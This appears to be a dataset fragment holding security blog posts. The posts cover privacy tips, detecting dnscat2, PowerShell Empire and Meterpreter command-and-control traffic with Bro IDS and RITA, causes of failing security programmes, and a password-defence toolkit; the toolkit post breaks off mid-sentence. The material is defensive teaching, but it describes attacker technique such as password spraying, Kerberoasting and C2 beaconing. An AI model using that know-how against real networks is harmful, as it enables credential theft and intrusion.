Eradication of this righteous infliction may have to begin where a lot of breached companies do; forensic analysis of the losses, recovery, and learning from the incident.\n\nPrivacy trainwreck.\nIf we were going to start over at the beginning with a clean slate, what would I do differently?\n\nPrepare. Amazon is one of best aggregators of data (bad?) and their cloud platform is awesome (good?). Spin an AWS CloudFormation instance of IAD Gov\u2019s GoSecure. Use the blog post here and the GitHub here to set up your OSI layer 1 through 4 cloaking device on a raspberry pi.\n\nGoSecure Magic.\n\nIdentify. I am going with threats here and presumably, because of what we\u2019ve learned, transit isn\u2019t all that interesting to data brokers. One of our blue teamers built a powershell script that does nothing except generate white noise. Every five minutes a new random URL is visited from a tiny VM full of ad garbage and all the fun of browsing the internet insecurely. For daily life, Private browsing mode and the array of plugins it takes to make one\u2019s browser configuration unique at Panopticlick will help you stay semi-anonymous. This crew will trade you Starbucks cards for log-free VPN access:\n\n10 bucks at Starbucks or 37 days of \u201cPrivateInternetAccess\u201d - I\u2019ll have a latte, por favor\n\nContain. This is where a conversation John and I had comes back into focus. As civilians, we should operating at Defcon 3 under the full assumption that we are being individually tracked, monitored and every conversation we have filtered for interesting tidbits. Our operational level should be to carry the RPi with us everywhere, search with DuckDuckGo and support the EFF.\n\nNon-Attrib. Paypal takes gift cards!\nThe less you contribute:\n\nApps\nEULA\u2019s\nLocation Data\n\nThe better:\n\nUse DuckDuckGo\nPrivateInternetAccess\nCheck out (and cleanse) your google history\n\nWe are stopping here, since we are back where we began. There\u2019s been an incident. We\u2019ve been compromised.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Let's Go Hunting! How to Hunt Command & Control Channels Using Bro IDS and RITA\"\nTaxonomies: \"Blue Team, Hunt Teaming, Bro IDS, dnscat2, How to, meterpreter, PowerShell Empire, RITA\"\nCreation Date: \"Wed, 13 Sep 2017 14:55:39 +0000\"\nLogan Lembke//\n\nHere at BHIS, we \u2665 Bro IDS.\n\nImagine... Bro IDS Everywhere!\n\nIf you haven\u2019t encountered Bro IDS before, checkout this webcast on John\u2019s Youtube channel discussing the need for Bro IDS and what it can offer your local blue team.\n\nReadying Your Weapons: Installing Bro IDS\n\nBro IDS requires a UNIX like operating system such as Linux, Mac OS, or BSD.\n\nBro installations are generally tailored to their environment. As such, there are several ways to get started with Bro. The official installation instructions suggest compiling Bro from source. While this approach will provide you with extra goodies, a packaged binary will do just fine for offline packet capture analysis.\n\nIn order to install a packaged version of Bro IDS:\n\nVisit https://www.bro.org/download/packages.html\n\nFind and run the instructions for your operating system\n\nInstall the \n\nbro-aux\n\npackage as well\n\nAdd\n\n/opt/bro/bin\n\nto your\n\n$PATH\n\nAlternatively, I\u2019ve put together an installation script for Debian based systems which will compile Bro IDS from source with all of its optional dependencies.\n\nUnderstanding the Tracks\n\n We\u2019ll Even Catch the Ninja \n\nBro IDS may be used to directly analyze a tapped network; however, Bro is also able to analyze raw pcap files. Included below are three sample packet captures. Each capture contains the traffic produced by an infected machine (10.200.201.29) communicating back to an attack server. Before continuing, download the following files:\n\nDnscat2 (Command and control using DNS queries)\n\nPowershell Empire (Command and control using HTTPS connections)\n\nMeterpreter (Command and control using TCP connections)\n\nAfter downloading each of the individual packet captures, open up a terminal, and move each file into its own directory. Bro IDS writes its analysis results out to the current working directory, and we don\u2019t want to confuse the results from the different packet captures. Finally, extract each file with\n\ngunzip [sample.pcap.gz]\n\nRunning \u201cfind\u201d from the top level directory should yield something similar to this:\n\nOnce the files are in their individual folders, we need to run Bro. In each of the individual folders, run\n\nbro -C -r [sample.pcap] local \u201cSite::local_nets += { 10.0.0.0/8 }\n\nThis will produce a number of logs in each directory. The700\n\n-C\n\nflag tells Bro to ignore the packet checksums, the\n\n-r\n\nflag tells Bro to read a pcap file, and the rest lets Bro know that the 10.x.x.x/8 subnet is our local network.\n\nIn a real-world scenario, Bro produces an extraordinarily large amount of data to sift through. While the official documentation is actively maintained, it is spread across multiple web pages. Alternatively, Critical Stack has put together a helpful handout explaining each of the logs.\n\nEasy Game: Dnscat2 (DNS Tunneling C2)\n\n The Original DNSCat Logo: Isn\u2019t He Cute? \n\nDnscat2 has been mentioned a couple of times before on the BHIS blog. We showed that the tool could bypass Cylance, and Luke presented his rewrite of the tool using Powershell. If you\u2019re unfamiliar with dnscat2, I encourage you to take a look at our earlier posts before continuing.\n\nConn.log\n\nThe connection log is the most important Bro log to review. Per the Bro IDS website, \u201c[The connection log] manages the tracking/logging of general information regarding TCP, UDP, and ICMP traffic. For UDP and ICMP, \u201cconnections\u201d are to be interpreted using flow semantics (sequence of packets from a source host/port to a destination host/port).\u201d\n\nThese \u201cflow semantics\u201d catch dnscat2 red-handed. Normally, when looking at a packet capture, UDP traffic is seen as a stream of individual datagrams sent across the network. However, Bro IDS groups these connections together as long as they happen at a reasonable rate over a unique socket pair. This means Bro IDS can easily point out long UDP \u201csessions.\u201d\n\nIn the conn.log produced by analyzing dnscat2.pcap, you should see the following line\n\n1503528301.909886    CoPfoo4LI4g4NNUFOe    10.200.201.29    33733    10.200.201.2    53    udp    dns    2467.745404    402129    639484    SF    T    T    0    Dd    4837    537565    4837    774920    (empty)\n\nThis line shows that our infected host, 10.200.201.29, issued thousands of consecutive DNS queries over the period of 2,467.7 minutes (41 hours)! Any long-running connections should be immediately suspect, especially if they happen to be running over DNS.\n\nDns.log\n\nThe DNS log is one of the most helpful logs for identifying user behavior. While most traffic is secured by TLS and hidden from analysis, we can still find out which sites our individual hosts have connected to via their DNS lookups.\n\nThe DNS log produced by the Dnscat2 is especially gnarly. I recommend using\n\nless -S dns.log\n\n in order to view the file. The\n\n-S \n\noption prevents word wrapping.\n\nUpon opening the file, you will notice that all of the requests share a common \u201csuper\u201d domain:\n\nsirknightthe.chickenkiller.com\n\nMy command and control server is the authoritative name server for this domain. As such, any dns queries for a subdomain of\n\nsirknightthe.chickenkiller.com\n\nwill be sent to it. The final subdomains are generated by the dnscat2 client in order to send data back to the C2 server. Since the dnscat2 client needs to encode all of its data in these subdomains, it needs to produce a large number of them. In order to catch this DNS tunneling behavior, we need to keep a count of the subdomains we have seen for a given \u201csuper\u201d domain. After gathering this data, we look for abnormally high ranking counts. However, there may be another way to catch Dnscat2.\n\nBy default, the Dnscat2 client sends out MX, CNAME, and TXT record queries. While CNAME queries will appear in almost every network environment, MX and TXT queries are somewhat rare. An abnormal influx of MX, CNAME, or TXT records may indicate that a dns tunnel is operating on your network.\n\nUpping the Difficulty: Powershell Empire (Reverse HTTPS C2)\n\nPowershell Empire is one of the most used post-exploitation tool kits available. In the sample linked above, a python based implant was ran on a Linux machine. This infected machine then called back to a Powershell Empire C2 server over HTTPS.\n\nConn.log\n\nUnfortunately, Powershell Empire doesn\u2019t keep a single TCP session alive so we can\u2019t use the same long connection analysis we used earlier for dnscat2. Rather, it \u201cbeacons.\u201d After you open the connection log produced by the Powershell Empire capture, look at the recorded timestamps. If you look closely, you will see that the implant called back to the C2 server every 5 seconds. Using frequency analysis, we can clearly spot this beaconing behavior. Alternatively, we can simply look for hosts which have made a large number of connections to a single external host over the course of a day. \n\nUnfortunately, this beaconing behavior is not so readily apparent in real-world packet captures. Connections from other systems clutter up the connection log and it is difficult to check the timestamps directly. Beyond the \u201cneedle in the haystack\u201d problem, \u201cjitter\u201d may be introduced to the connection. Jitter randomly adds delays between the beacons, throwing off the \u201cevery 5 seconds\u201d relation we had noticed before. However, advanced frequency analyses have been shown to detect beaconing behavior even in the presence of jitter.\n\nAlternatively, look at the fields labeled \n\norig_bytes \n\nand \n\nresp_bytes\n\nThese are extremely regular. These fields measure how many bytes were sent to and from our infected host over each TCP connection. Unfortunately, these fields may slightly vary over the course of the infection. As a hacker pivots or exfiltrates data from a system, more or less data may be sent.\n\nSsl.log\n\nWhile SSL and TLS secure most of our data, Bro IDS is able to get around this by harvesting unencrypted connection metadata and logging it to the SSL log.\n\nIn this capture, almost every connection was made over TLS. You can prove this to yourself by comparing the connection and SSL logs. In fact, you can relate the log entries using their second field,\n\nuid\n\nBro analyzes each connection in several different ways and uses these UIDs to relate the analysis results.\n\nIn the SSL log we see the same beaconing behavior; however, we see something more interesting. Each connection was encrypted with a self-signed certificate. By default, most hacking tools use self-signed certificates. This makes it easy to catch lazy hackers.\n\nIf you\u2019re interested in learning more about the certificates used for each connection, look at the corresponding entries in the x509 and files logs.\n\nSeeing Through the Camouflage: Meterpreter (Reverse TCP C2)\n\n Even Camo is Digital Now \n\nA Meterpreter connection can be established using either a reverse TCP transport or a reverse HTTP(S) transport, meaning Meterpreter has a few different ways to call back home. The HTTPS transport is similar to that of Powershell Empire. However, the TCP transport maintains an active TCP connection throughout the infection. In this capture, I elected to use the reverse TCP transport. I\u2019ve purposefully left the Meterpreter packet capture dirty in hopes that you can sift through the data in order to find the infection.\n\nBro-Cut\n\nLearning how to use tools like grep, cut, and awk makes this problem tractable. However, Bro IDS also includes a python tool called bro-cut. Similar to dnscat2, we are looking for long connections. Bro-cut allows us to throw away the fields we aren\u2019t interested in.\n\ncat conn.log | bro-cut uid id.orig_h id.resp_h duration | sort -nr -k4 | head -n 5\n\nwill display the top 5 connections by duration. From here, we grab the UID of the top connection and grep out the full connection details. For me, the top connection is labeled\n\nCFRuW5gJrBirOIYZ4\n\n and I run\n\ngrep CFRuW5gJrBirOIYZ4 conn.log\n\nYour UID may be different.\n\nAfter running a whois search on the destination, we see that the IP address is part of the Amazon EC2 cloud. While I conducted this capture in EC2, it should be clear that long connections to cloud services should be immediately suspect.\n\nGrep, cut, awk, bro-cut, sort, head, tail, and the rest of the standard *nix utilities are essential for making use of the logs produced by Bro IDS in the real world.\n\nOther Logs\n\nThe Meterpreter packet capture is a bit dirty. While this makes finding the discussed infection a bit harder, it demonstrates some of Bro\u2019s more advanced capabilities. The http log shows the results of upgrading a host\u2019s APT package manager and installing Elinks, a console based web browser. The software log boils this information down and tells us that 10.200.201.29 ran several versions of APT in addition to the ELinks web browser. Over time, the known_hosts log and known_services log can be used in conjunction with the software log in order to build up an inventory of a tapped network. Beyond these files, Bro IDS offers a multitude of interesting monitoring capabilities including full file captures, blacklist analyses, and more.\n\nHunting With Robots: RITA\n\nHunting through logs by hand takes time and practice. However, software has been developed to address this problem. Rather than stringing along a variety of *nix commands across a slew of terminals, we can use software to direct our search. Enter RITA, Real Intelligence Threat Analytics.\n\n Don\u2019t We All? \n\nRITA reads logs produced by Bro IDS and extracts as many interesting features from the dataset as possible. RITA finds dnscat2 by spotting long-lasting connections as well as by counting subdomains. Additionally, RITA has a special beaconing module which uses advanced techniques from frequency analysis in order to find beaconing hosts. Powershell Empire and other beaconing software is easily spotted after running RITA. Meterpreter is no different. RITA is able to see through the camouflage and show you the target.\n\nIn order to get started with RITA, head over to our project page, and install the program alongside John. Alternatively, visit the GitHub page and follow the instructions listed there.\n\nIn short:\n\nSpin up an instance of Ubuntu 16.04 (or similar)\n\nInstall git if it isn\u2019t installed\n\nsudo apt install git\n\nClone RITA\n\ngit clone https://github.com/ocmdev/rita.git\n\nRun the installer\n\nchmod +x install.sh; sudo ./install.sh\n\nSource your .bashrc\n\nsource ~/.bashrc\n\nMove the Bro logs from earlier to your RITA system if they are not there\n\nStart MongoDB\n\nsudo systemctl start mongod\n\nIn the top level directory containing the three sample folders, run\n\nrita import -i [meterpreter folder] -d Meterpreter\n\nrita import -i [ps-empire folder] -d Powershell-Empire\n\nrita import -i [dnscat2 folder] -d DNSCat2\n\nAnalyze the ingested data\n\nrita analyze\n\nCreate the report\n\nrita html-report\n\nFinally, open the file in a web browser\n\nrita-html-report/index.html\n\nYou should see the following display:\n\nTo begin with, open up Meterpreter, and click on long connections at the top.\n\nHere you will see the results we found earlier with bro-cut. Next, open up Powershell-Empire and click on the beacons tab.\n\nRITA clearly shows the beacon.  The field \u201cTS score\u201d stands for the timestamp score, meaning that based on the connection timestamps, there was a perfect beacon from 10.200.201.29 to 18.220.208.40. This beacon occurred most frequently at 5-second intervals and beaconed 652 times. Finally, go to the dnscat2 results and click on DNS.\n\nHere, we can see that there were 4,850 subdomains of\n\nsirknightthe.chickenkiller.com\n\nthat were queried. In addition, if you go to the long connections tab, you will see the same results from earlier.\n\nCurrently, RITA does not alert on anything. Rather it is to be used as an assistant \u2014 a tactical tool. In addition to the analyses we discussed earlier, RITA performs blacklist checks, network scan detection, long URL analysis, and analysis of user-agent strings. Going forward, RITA will be a testbed for a multitude of other analyses, replacing the searches we normally do by hand.\n\nHacking Leaves Tracks. Now We Can Follow Them.\n\nHackers may try to cover their tracks, but inevitably Bro IDS will record their movements. The beauty of Bro IDS is that it just needs a network tap. It can run on an entirely separate network. Unless a hacker gains physical control of the system, they will not defeat Bro. However, Bro is not a cure-all. It simply produces too much data. Any signs of hacking are mixed and muddled with everyday traffic.\n\nBro IDS is able to produce terabytes of data. Yet, in order to extract value out of it, we need to either invest hundreds of man-hours in manual analysis or in automation. Our hope is that RITA will solve this problem and aid you in your hunts to come.\n\nDropbox Links: \n\nDnscat2 (Command and control using DNS queries)\n\nhttps://www.dropbox.com/s/izmku9nqysjiwq0/dnscat2.pcap.gz?dl=0 \n\nPowershell Empire (Command and control using HTTPS connections)\n\nhttps://www.dropbox.com/s/gdlnfwj6qeiz2cf/ps-empire.pcap.gz?dl=0 \n\nMeterpreter (Command and control using TCP connections)\n\nhttps://www.dropbox.com/s/f7653izqksr12of/meterpreter.pcap.gz?dl=0 \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Five Signs Your Organization Is Failing at Security\"\nTaxonomies: \"InfoSec 101, Executive Leadership Team, Industry, infosec, security\"\nCreation Date: \"Mon, 18 Sep 2017 15:50:51 +0000\"\n@1iJax aka The Security Viking//\n\nJust when you think the drum has been beaten loudly enough for long enough, a quick survey of organizations across the spectrum will find many companies still just \u201cdon\u2019t get it\u201d. No, this is not an exhaustive list, there is only so much we can fit on one post. If you\u2019re an executive or member of management, and you\u2019re having trouble getting a security program going, or you really have no clue if you have an effective program, please read on. If you\u2019re a Security Pro that feels something isn\u2019t right at your organization, and every step forward is met with one, or more, steps backward in your program, then there is a good chance that the org is systematically failing.\n1. Management Has No Clear Idea What Security Is -\nThis is a pretty big one, just about any other \u201csign\u201d mentioned below is a symptom. We need to discuss it and Management needs to understand it so that we can be level set on the rest of the signs. What is the purpose of security? If the first answer that came to your head was \u201cduh...protect the company\u201d I can\u2019t fault you for thinking that, but it\u2019s wrong. It is actually the executives, in any organization, whose job it is to protect the company, not the rank and file members of Security.\nSo what is Security\u2019s job? I won\u2019t bore you with some acronym. At a very high level it is two simple things. (Well it sounds simple, but anyone that studies game theory will tell you that the simpler the rules, the more complex the game.)\n\nAdvise upper management of the threats the organization is facing.\nOversight of the program upper management has tasked to counter those threats\n\nThat\u2019s it.\nSome Security folks may be screaming at the screen when I say this. \u201cWho\u2019s this Viking guy? Security is way more complicated than that and I go home each day and tell myself how proud I am that I protected that company!\u201d Sure we use all sorts of processes, methods, and tools for our security programs, but at the end of the day, all of those things are just details that support our mission of Advising and Overseeing. (I did say simple rules make complex games.)\nCompanies that fail to recognize this usually fail hard. They are easily identified by their lack of strategy, and oh boy, just wait to see how they respond to a breach...welcome to the shit-show! Executives in these Orgs will sound clueless when trying to describe the kind of program they have.\nI worked at a multi-billion dollar company that recently had doubled in size. During a town hall meeting with the CEO and COO, I asked a simple question,\n\u201cWith the increase in size and the multiple verticals we are in, has anyone started discussions around appointing a CISO\u201d.\nI wasn\u2019t asking them if they had a CISO in mind, I was just simply asking if the discussion had started. The first sign something was wrong was when the Executive VP, head of HR asked back, \u201cWhat is a CISO?\u201d\n(We\u2019ll take this moment to pause and allow the security guys to finish laughing.)\nThe world is full of acronyms and not everybody can pull from memory every acronym they have heard so I simply explained those terms and expanded on my question a little to give more context.\nA few minutes passed and the CEO said, \u201cWe have a question, \u2018With the increase in size and the multiple verticals we are in has anyone started discussions around appointing a CISO or CSO\u2019.\u201d\nWhat happened next made me wish I had never asked.\nThe CEO responded, \u201cI think we have people that are responsible for that so no, next question\u201d.\nDid I expect them to tip their hand and detail how they are strategically building the Security team to the whole world? No, but at a minimum at least pretend to care and give an answer that sounds like the thought of security had crossed their mind.\nInstead, we got an answer that clearly came from an Executive that \u201cdidn\u2019t get it\u201d and had been insulated by many layers from Security. Right around that time when I asked the question they moved the head of InfoSec another layer lower than the CIO and started the destruction of that team.\nWhich brings us to our next point...\n \n2. Improper reporting structure. To report to the CIO or not report to the CIO, is NOT the question -\nPundits have gone back and forth on the question, \u201cTo whom does InfoSec report?\u201d As the grip of technology has deepened, it has often become the practice to shuffle these teams under the CIO.\nThe problem with this approach, at the risk of oversimplifying things, IT exists to serve the technological wants and dreams of the business. The security practitioner's job is advice and oversight, *gasp* and requires telling people no.\nNo, is an impossible word for the CIO, use it too much and they won\u2019t be CIO for long. They can say, \u201cYes, but\u2026\u201d. \u201cYes, but we need more money.\u201d \u201cYes, but we need more headcount\u2026\u201d etc.  Can you imagine a CIO saying \u201cNo, we can\u2019t build that app to better engage our customers and make more money\u201d? Neither can I. The CIO that got stuck with security can quickly become a filter stifling our purpose of Advice and Oversight. (Hey, they\u2019re just trying to guide the tech ship and some jerk that fancies himself a Viking keeps telling the IT guys they can\u2019t use TLS 1.0.) God forbid if an inexperienced CIO shuffles security under another layer of IT management. Try it if you really want to see the wheels fall off.\nTo be fair to the CIO, CISO\u2019s that stonewall the business don\u2019t remain CISO\u2019s for long either. We are in the Risk Mitigation business where sometimes battles are chosen carefully and political capital is stored for use at a later date.\nWho should we report to then? Some say CFO, some COO, Chief General Counsel...etc. Some have even proposed that IT should actually report to a CISO. It sounds interesting but you still end up with someone that has two roles with occasional competing interests. To simplify this question first understand that reporting structure directly impacts #1...\n\nAdvise upper management of the threats the organization is facing.\nOversight of the program upper management has tasked to counter those threats\n\nIn order for Security to fulfill its purpose, it *MUST* report directly to a member of the Executive Leadership Team. The vertical your company is in may dictate which member of the ELT that is. At the end of the day though it really doesn\u2019t matter which \u201cC\u201d suite person you report to, so long as that person has a \u201cseat at the table\u201d, and takes security seriously. Anything less is just pretending and results in a game of telephone as each layer of management interprets what Security means.\n \n3. Policies Are Not Owned By Executives\nYou would think that this would be obvious, unfortunately, this is not always the case. I worked at a shop where the CIO insisted they get to review policies we proposed before legal did. Of course, Security reported to that CIO, so that much of our work was met with all sorts of stonewalling and watering down.\nThe phrase of the day was, \u201cWe need to keep these close so we can remain fluid and adaptable to the business...blah, blah, blah.\u201d\nBasically, they liked being in control of the Security policy so it could be changed as needed to enable saying \u201cYes!\u201d to the business without adding to the workload. Remember IT can\u2019t say no.\nDrawing from our expanded knowledge of the simple purpose of Security (might be a theme here), this problem directly impacts Security\u2019s ability to provide oversight. Executive Leadership *MUST* own the directives that dictate the direction the Security program is running.\nPolicies are the rules by which all employees must operate. Without Executive sign-off, any manager of equal or greater rank than the top Infosec manager can simply interpret what that policy means, as they see fit.\nYes, Security gets that there is a difference between attainable, and aspirational policies. We might advise against it, we might ask, \u201cBut shouldn\u2019t we aspire to be more secure?\u201d. We wouldn\u2019t be good advisors if we simply bent the direction the wind blew, but we also get that policies that you cannot hope to meet are unworkable for everyone involved.\nThis is why we need the ELT, you know the folks responsible for protecting the company, to weigh these decisions carefully and agree on the direction forward. Everything we do, every process, every wall we build is a direct result of Policy. Only when the ELT owns and feels comfortable defending, these tough decisions can Security effectively move forward.\nIf you haven\u2019t caught on yet, most of the signs of a failing InfoSec program come directly from Upper Management\u2019s lack of engagement. Back while studying for a certain cert I had the privilege to get some training from someone that wrote a really popular study guide. I\u2019m quoting from memory so this is probably off the mark, she essentially said,\n\u201cIf Security at your organization does not directly report to the ELT and the ELT or board doesn\u2019t sign off on policy, you will not succeed. If that organization is unwilling to change you need to run away and don\u2019t look back.\u201d\n(Sorry if I butchered this quote, RIP Shon Harris...f* cancer!)\n \n4. Security has no idea what the purpose of security is -\nThis one made me laugh as I typed but sadly this is becoming more and truer. Simply put, security resources continue to get stretched thin, and there are a whole lot of folks with only a couple years experience running around with senior titles. In my day (at 42 I\u2019m an old curmudgeon in the industry) I had to work eight years before I got a \u201csenior\u201d title.\nUnfortunately, it\u2019s the nature of the business now, double digit unemployment rates in the field have led to an explosion of newbies from poorly planned infosec college programs and from IT. The influx of IT folks, I\u2019m speaking mostly towards the management side, is bringing an \u201cIT mentality\u201d with them. (Nothing wrong with IT folks coming over, we love to have you, please send more developers this way.) What used to be a slow trickle of highly qualified IT people learning the ropes from knowledgeable Security staff has quickly become the blind leading the blind. Newly minted IT managers in Security will often times filter, or even completely withhold, the results of an honest attempt to evaluate the company's readiness level.\nThis natural reaction towards not wanting to look bad to senior management is a glaring violation of the purpose of Security.\nI\u2019ve heard things like, \u201cThere\u2019s too much red, no way management will take us seriously,\u201d or \u201cI can\u2019t give them this, it makes us look really bad.\u201d And even worse, \u201cI need you to look closely and see if you can change of few of those things\u201d.\nDear former IT manager now in Security, we need to have a talk. We need you to stop capitulating. You need to understand that the place to politicise a report is not in the findings, it is in your management response!\nI get it, it's hard to show our warts. Nobody is asking you to wear a tinfoil hat and scream that the sky is falling, but when you shirk your duty to advise you are missing your chance to show them how they can get better and losing the respect of your staff in the process.\nAs a manager, don\u2019t you agree that your usefulness to upper management is your ability to provide a vision for the future? This is your time to shine and sell that vision!\n \n5. Revolving Door of Security staff\nDo people seem to come and go? Do most of the analysts and engineers on your team have less than five years with the company? Does your program seem to be on track for a couple of years and then everyone vanishes overnight? If you answered yes to any of these then you\u2019ve got a problem.\nWith some regions reporting unemployment numbers as low as -16% in InfoSec fields, your staff will quickly learn they don\u2019t have to wait for you to \u201cfigure it out\u201d.\nSo how do we fix it?\nFirst, you need to understand the type of staff that became Security folks in the first place. They absolutely read between all the lines! These are the people that crawl through all your systems and pick apart every nuance looking for threats to your organization, do you not think they are reading your every move and weighing your words?\nThey know when they are being talked down too. They know when management is not taking Security seriously. If you don\u2019t care then why should they? These folks are constantly under the gun. They often times stay up at night just learning about the latest and greatest problems in the world. They live, breathe, and eat from the seedy underbelly of the internet and many of them do take \u201cprotecting the company\u201d personally even when we know we shouldn\u2019t.\nAppreciation for the work security does is helpful but straight talk goes even further. Be honest about your shortcomings as a company, don\u2019t try to wash over them with some pretty facade. We have highly attuned b.s. meters. Following through with the suggestions Security gives you to fix these shortcomings goes a long way. Signaling to your security staff that the org is ready to try to fix things can have a huge impact on morale.\nNow you\u2019re talking the talk, how do we walk it? Three words: Security Staffing Standard. Having a written plan for addressing staffing issues tells your experienced staff that management recognizes the need for a healthy program, and gives you something you can manage towards.\nNo two companies have the same staffing needs and nobody has come up with the perfect formula. Personally, when it comes to the number of folks in the technology side of Security, I like to use the \u201cRatio of IT\u201d measure as a starting place.\nA detailed look at this may be a post for another day, but basically being at 6-8% of IT staff allocated to Security is about the middle of the pack. Obviously, the verticals you are in, and some specialty skill sets can influence this number.\nKnow your business, adjust accordingly, and be prepared to adapt and change that Standard as the environments you operate in change.\nStrong word of caution...Do not fall into the tool trap!!! Buying a product does NOT replace a headcount, in fact, it may increase the need due to the specialty nature of managing that tool. Tools are no different from hammers. Hammers don\u2019t swing themselves!\n \nMy company has all these problems, now what -\nIf you are C level, and you did happen across my little rant, the ball is in your court.  Own your policies, enable Security by having them report directly to you, staff accordingly, and you will be light years ahead of the next guy.  For the Security guys, even if your org hits all of these, don\u2019t bail right away.  See it as a challenge, do your best to fight the good fight, and if you see no attempt to improve, leave with a smile. (or just flat out run like Shon suggested)  You survived, you learned, and you can take all that knowledge of what doesn\u2019t work and help an org that really really really wants and needs your help.  I\u2019ll leave you (especially our InfoSec brothers and sisters at Equifax) a favorite proverb of mine that I passed to a Director at Target shortly after their breach\u2026\u201dSmooth seas do not make skillful sailors!\u201d  Good luck out there.\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The CredDefense Toolkit\"\nTaxonomies: \"Author, Beau Bullock, Blue Team, Blue Team Tools, Brian Fehrman, Cred Defense Tool Kit, CredDefense, CredDefense Toolkit, event log consolidation, hardening accounts, kerberoasting, password auditing, password spraying, Pentesting, ResponderGuard\"\nCreation Date: \"Wed, 27 Sep 2017 15:05:25 +0000\"\nDerek Banks, Beau Bullock, & Brian Fehrman //\n\nOur clients often ask how they could have detected and prevented the post-exploitation activities we used in their environment to gain elevated privileges and ultimately access sensitive data. Most of the time, this is achieved through credential abuse.  \n\nAs pentesters, the primary condition we take advantage of in credential abuse is poor passwords. In any given environment with more than a few hundred end-users, it is almost guaranteed that someone has chosen the season and year (e.g. Summer2017) as their password. This makes it pretty easy to guess using a technique known as password spraying.\n\nOne way to fix this is to change the minimum password length for accounts, but for reasons both technical and political, this is not always possible for every environment to do this.  \n\nThere are also a number of additional credential abuse attacks that take advantage of flaws in protocol implementation or default environment configuration such as with Kerberoasting and LLMNR Poisoning.\n\nWouldn\u2019t it be great if there was a free toolset to protect your credentials even when password length couldn\u2019t be changed and to alert on other credential attacks being conducted in your network?  That\u2019s why we created The CredDefense Toolkit - to have a free way to detect and prevent credential abuse attacks.\n\nPassword Filter\n\nWindows domains enforce a standard set of complexity requirements on user passwords. When a user attempts to set a new password, the new password is checked against the requirements. By default, the following requirements are in place:\n\nEight-characters minimum\n\nMust contain three out of the four following\n\nUppercase Letter   \n\nLowercase Letter   \n\nSpecial Character   \n\nNumber \n\nAdditionally, users are required to set a new password every 90 days. So... what meets these requirements but is still easy for users to pick and remember? Let\u2019s just say that most pentesters are very aware of the current season and the current year. Fall2017, for instance.\n\nHow can you prevent users from picking these types of passwords? Sure, you can increase the minimum number of characters and enforce additional complexity. We certainly have much less success password spraying in environments that require 15 characters or more. We do, however, still run into users picking things like SummerSummmer2017. Additionally, we understand the political backlash that can be associated with requiring that many characters. There has to be another way...and there is! Enter: Windows Password Filtering.\n\nThe Windows Password Filter feature allows you to add additional checks when a user attempts to pick a new password. The password first goes through the domain\u2019s password complexity check. After passing the complexity check, it then gets passed through your custom check. You can have multiple checks if you\u2019d like. The image below shows the process.\n\nHow is this implemented? The entire procedure is described here: https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx\n\nThis can seem a bit tedious and overwhelming to do manually...which is why we have incorporated it into the Cred Defense interface! Our work is based on this open-source project:\n\nhttps://github.com/jephthai/OpenPasswordFilter\n\nIf you open the Cred Defense tool, select the Password Filter option. You will then be asked if you\u2019d like to Install / Uninstall the feature or just update the password list that is used.\n\nFor Installing / Uninstall, you will be presented with two columns. The program will grab down a list of all domain controllers in your environment. It will then check each domain controller (DC) to see if it has the EasyPasswordFilter value in the HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Notifications registry key. If the key is not present, it indicates that the DC is likely not running the password filter and the names of those DCs will be placed in the Unconfigured DCs column. Selecting a DC name from the Unconfigured DCs list and clicking Install will:\n\nDeploy the EasyPasswordFilter DLL to the %SystemRoot%\\Windows\\System32 directory on the target DC\n\nDeploy the password list to %SystemRoot%\\epf folder on the target DC\n\nAdd the EasyPasswordFilter value to the HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Notifications registry key on the target DC\n\nAsk you if you\u2019d like to reboot the DC and then instruct the DC to restart if you choose to do so\n\nFor uninstalling, the program simply removes the EasyPasswordFilter value from the registry on the target DC and asks if you\u2019d like to reboot the machine.\n\nPretty simple, huh? A few clicks and you\u2019re off and running!\n\nHow about updating the password list? If you choose this option, you will be shown a list of all of the DCs on which the password filter has been installed. Click the Edit Passwords button and the list of passwords will be opened in Notepad.exe for you to edit. Note that the password filter is set-up to be case-insensitive. Additionally, it will perform substring matching so that you don\u2019t have to type Winter2017, Winter2018, WinterWinter2017, etc., and can instead just type winter. There is also a safety-check in place that does not allow you to specify words that are less than four characters. Once you\u2019re done editing the password list, save the list and click the Deploy Updates button. The password list will then be deployed to all of the DCs that are shown in the DC\u2019s Running Password Filter list. This does not require you to restart the domain controllers.\n\nPassword Auditing\n\nPassword filtering can be quite effective for preventing users from picking weak passwords. What about current passwords in the environment? How about Domain Admins reusing the same password for their normal user account? Do you have passwords that don\u2019t expire? How about user accounts that don\u2019t require a password? Is the same password used for multiple administrative accounts? All of these are very important questions that should be answered before threat actors find those answers.\n\nThe Password Auditing feature of the Cred Defense toolkit can make this process painless! The work is based on the DSInternals toolkit: https://github.com/MichaelGrafnetter/DSInternals\n\nFirst, select the Password Auditing option from the main menu. You will then be presented with a list of Domains within the current forest.\n\nAfter selecting the domain, you will be presented with a list of Domain Controllers within that domain.\n\nAfter selecting a Domain Controller, you will be asked to select a password list to use for the password-cracking portion of the audit. You will also be asked to specify where you\u2019d like the results to be saved.\n\nAfter selecting the options, click the Run Audit button and the process will be kicked off. The program will leverage the AD Replication Sync feature to grab Active Directory information from the targeted DC. The information is kept in memory and is not written to disk. The program will perform multiple checks and output the results to the file specified. Some of the checks include:\n\nPassword Reuse\n\nLanMan Hashes\n\nAdmin Delegation\n\nNo Password\n\nPassword not Required\n\nPassword doesn\u2019t Expire\n\nSo how long does this take? We ran this from a VM that was allocated 8 GB of RAM and 2 Cores. It utilized the Human-Readable Crackstation password list. The environment contained 3 Domain Controllers and over 30,000 unique user hashes. The entire process completed in roughly 90 seconds!\n\nEvent Log Consolidation\n\nThere are generally two categories of environments that we encounter on our engagements when it comes to logging.  The first is nothing is being logged and there is really no visibility into any information available that would help in detecting that malicious activity was occurring.  The second is that every log event is going into a SEIM and no one can effectively use it to discover or alert on anything useful.\n\nIf you are in either scenario, setting up a more targeted approach to consolidating events from Windows Endpoints.  As part of the CredDefense toolkit, we wrote this guide to setting up forwarding event logs to a central Windows Event Forwarding server.\n\nKerberoasting\n\nOne of the first attacks we try when gaining a foothold in an environment is known as Kerberoasting.  The Microsoft implementation of Kerberos is complicated, but the gist of the attack is that it takes advantage of legacy Active Directory support for older Windows clients and the type of encryption used and the key material used to 